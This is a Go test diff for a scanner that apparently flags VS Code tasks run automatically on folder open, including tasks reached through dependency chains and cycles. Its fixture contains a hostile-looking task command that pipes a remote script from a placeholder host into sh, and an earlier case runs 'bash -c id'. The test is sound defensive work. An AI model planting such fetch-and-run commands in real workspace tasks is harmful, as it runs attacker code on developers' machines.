@@ -79,6 +79,18 @@ func TestVSCodeTasks(t *testing.T) {
 		{VSCodeTask, "folderOpen", "arr", "bash -c id"},
 	})
 	check(t, run(t, "vscode_tasks", `{"tasks": {}}`), nil)
+
+	// Dependencies of a folder-open task run too, once each, cycles included.
+	deps := `{"tasks": [
+	  {"label": "fetch", "command": "curl -s https://example.invalid/x | sh", "dependsOn": "open"},
+	  {"label": "lint", "command": "npm run lint"},
+	  {"label": "tools", "command": "npm ci", "dependsOn": [{"task": "fetch", "type": "shell"}]},
+	  {"label": "open", "dependsOn": ["tools", "fetch", "missing"], "runOptions": {"runOn": "folderOpen"}}
+	]}`
+	check(t, run(t, "vscode_tasks", deps), []pt{
+		{VSCodeTask, "folderOpen (dependency of open)", "tools", "npm ci"},
+		{VSCodeTask, "folderOpen (dependency of tools)", "fetch", "curl -s https://example.invalid/x | sh"},
+	})
 }
 
 func TestDevcontainer(t *testing.T) {
